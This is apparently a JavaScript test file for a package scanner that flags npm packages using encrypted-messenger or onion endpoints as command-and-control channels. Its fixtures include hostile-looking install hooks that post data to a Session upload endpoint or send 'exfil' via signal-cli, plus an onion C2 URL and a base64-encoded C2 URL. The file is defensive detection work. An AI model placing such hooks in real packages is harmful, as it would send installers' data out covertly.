import { test } from 'node:test';
import assert from 'assert/strict';
import { scan } from '../backend/detectors/tier1-encrypted-c2.js';

test('D11: Session/Oxen endpoint detected in script', async () => {
  const pkgJson = {
    name: 'test-pkg',
    scripts: {
      postinstall: 'node -e "fetch(\'https://filev2.getsession.org/upload\')"',
    },
  };
  const findings = await scan(pkgJson, [], null, null);
  assert.equal(findings.length, 1);
  assert.equal(findings[0].detector, 'tier1-encrypted-c2');
  assert.ok(
    findings[0].confidenceScore >= 70,
    `expected >= 70, got ${findings[0].confidenceScore}`
  );
});

test('D11: Signal endpoint detected', async () => {
  const pkgJson = {
    name: 'test-pkg',
    scripts: {
      preinstall: 'signal-cli send -m "exfil" +1234567890',
    },
  };
  const findings = await scan(pkgJson, [], null, null);
  assert.equal(findings.length, 1);
});

test('D11: onion address in source code detected', async () => {
  const files = [{ path: 'c2.js', content: 'const url = "http://abcdefghijklmnop.onion/command"' }];
  const pkgJson = { name: 'test-pkg' };
  const findings = await scan(pkgJson, files, null, null);
  assert.equal(findings.length, 1);
});

test('D11: base64 encoded C2 URL detected', async () => {
  const files = [
    {
      path: 'install.js',
      content: 'const url = atob("aHR0cDovL2ZpbGV2Mi5nZXRzZXNzaW9uLm9yZy91cGxvYWQ=")',
    },
  ];
  const pkgJson = { name: 'test-pkg' };
  const findings = await scan(pkgJson, files, null, null);
  assert.equal(findings.length, 1);
});

test('D11: Briar project endpoint detected', async () => {
  const files = [{ path: 'conn.js', content: 'connect("briarproject.org:1234")' }];
  const pkgJson = { name: 'test-pkg' };
  const findings = await scan(pkgJson, files, null, null);
  assert.equal(findings.length, 1);
});

test('D11: clean code produces no findings', async () => {
  const files = [{ path: 'index.js', content: 'const x = 42; console.log(x);' }];
  const pkgJson = { name: 'test-pkg' };
  const findings = await scan(pkgJson, files, null, null);
  assert.equal(findings.length, 0);
});

test('D11: known reputable package returns no findings', async () => {
  const pkgJson = {
    name: 'express',
    scripts: { postinstall: 'filev2.getsession.org/upload' },
  };
  const findings = await scan(pkgJson, [], null, null);
  assert.equal(findings.length, 0);
});

test('D11: empty package returns no findings', async () => {
  const findings = await scan({}, [], null, null);
  assert.equal(findings.length, 0);
});
